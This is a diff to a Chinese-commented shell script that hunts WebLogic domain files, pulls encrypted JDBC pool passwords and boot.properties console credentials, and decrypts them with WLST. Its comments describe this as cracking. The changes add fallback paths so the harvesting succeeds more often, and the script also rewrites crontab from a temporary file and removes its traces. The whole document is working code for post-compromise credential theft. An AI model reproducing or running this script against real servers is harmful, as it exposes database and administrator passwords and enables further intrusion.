@@ -28,6 +28,10 @@ if [ "${wlst}" = "" ];
 then
    wlst=`echo ${sdomain}|sed 's/\/server.*//g'|xargs -I {}  find {} -type f -name "wlst.sh"|sort -u`
 fi
+if [ "${wlst}" = "" ];
+then
+   wlst=`echo ${sdomain}|sed 's/\/user_projects.*//g'|xargs -I {}  find {} -type f -name "wlst.sh"|sort -u`
+fi
 
 sdomain=`echo ${sdomain}|sed 's/domain\/.*$/domain/g'`
 echo "wlst= ${wlst}"
@@ -37,6 +41,14 @@ echo "sdomain = ${sdomain}"
 echo "连接池信息"
 find ${sdomain} -type f -name "*jdbc*.xml"|xargs -I {} cat {}| grep -B 10 "<password-encrypted>"
 enPswd=`find ${sdomain} -type f -name "*jdbc*.xml"|xargs -I {} cat {}|grep -Eo "<password-encrypted>([^<]+)<\/password-encrypted>"|sort -u|sed -E 's/<[^<>]+?>//g'`
+
+if [ "${enPswd}" = "" ];
+then
+   enPswd=`echo ${sdomain}|sed 's/\/server.*//g'|xargs -I {}  find {}  -type f -name "*jdbc*.xml"|xargs -I {} cat {}|grep -Eo "<password-encrypted>([^<]+)<\/password-encrypted>"|sort -u|sed -E 's/<[^<>]+?>//g'`
+fi
+
+if [ "${enPswd}" != "" ];
+then
 echo "jdbc pool pswd: ${enPswd}"
 # 获取破解后的密码
 tmpFl=`mktemp`
@@ -68,12 +80,15 @@ except:
 EOT
 echo "jdbc连接池密码..."
 ${wlst}  ${tmpFl}  ${sdomain} "${enPswd}"
+fi
+
+
 # 搜索weblogic console admin用户名及密码
 export DOMAIN_HOME=${sdomain}
 cd $DOMAIN_HOME/security
 cd $DOMAIN_HOME/*_domain/security
 echo "所有weblogic console 用户名及密码"
-find $DOMAIN_HOME/ -type f -name "boot.properties" |xargs -I {} grep -E "(username|password)" {}|sed -e "s/^username=\(.*\)/\1/"|sed -e "s/^password=\(.*\)/\1/"
+find `echo $DOMAIN_HOME|sed 's/base_domain//g'`/ -type f -name "boot.properties" |xargs -I {} grep -E "(username|password)" {}|sed -e "s/^username=\(.*\)/\1/"|sed -e "s/^password=\(.*\)/\1/"
 cat <<EOT>./xxx.py
 import os
 from weblogic.security.internal import *
@@ -91,7 +106,7 @@ for i in range(1, len(sys.argv)):
 
 EOT
 echo "开始破解weblogic console 用户名及密码"
-find ${sdomain} -type f -name "boot.properties" |xargs -I {} grep -E "(username|password)" {}|sed -e "s/^username=\(.*\)/\1/"|sed -e "s/^password=\(.*\)/\1/"|xargs ${wlst} ./xxx.py
+find `echo $DOMAIN_HOME|sed 's/base_domain//g'`/ -type f -name "boot.properties" |xargs -I {} grep -E "(username|password)" {}|sed -e "s/^username=\(.*\)/\1/"|sed -e "s/^password=\(.*\)/\1/"|xargs ${wlst} ./xxx.py
 rm -rf ./xxx.py
 
 # 获取jdbc配置信息
@@ -107,5 +122,5 @@ then
   `cat /tmp/myX.sh|sort -u | crontab -`
 fi
 
-rm /tmp/myX.sh
-rm ${tmpFl}
+rm -rf /tmp/myX.sh
+rm -rf ${tmpFl}
